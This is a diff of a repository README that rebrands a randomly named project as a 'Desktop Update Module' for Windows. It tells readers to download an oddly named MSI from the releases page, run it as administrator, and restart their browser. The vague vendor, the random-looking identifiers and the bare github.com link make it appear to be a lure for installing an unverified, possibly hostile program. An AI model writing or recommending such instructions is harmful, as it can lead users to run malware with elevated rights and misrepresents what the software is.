@@ -1,2 +1,37 @@
-# viewer-runtime-s5p59o
+# Desktop Update Module
+
 Windows desktop helper module distributed via GitHub Releases.
+
+## Overview
+
+| | |
+|---|---|
+| **Vendor** | Software Distribution |
+| **Latest release** | `v78647` |
+| **Platform** | Windows 10 / 11 (x64) |
+| **Runtime** | C# |
+
+## Installation
+
+1. Open the [Releases](https://github.com) page for this repository.
+2. Download `sc_8s5sijvnsj2wc_v70859.msi` from release **v78647**.
+3. Run the installer as administrator if prompted.
+4. Restart your browser or document app to load the updated module.
+
+## System requirements
+
+- Windows 10 version 1903 or later (64-bit)
+- .NET Desktop Runtime 6.0+ (bundled in installer when required)
+- 120 MB free disk space
+
+## Changelog
+
+See [CHANGELOG.md](CHANGELOG.md) for version history.
+
+## License
+
+Distributed under the terms in [LICENSE](LICENSE).
+
+## Support
+
+For enterprise deployment notes see [docs/INSTALL.md](docs/INSTALL.md).
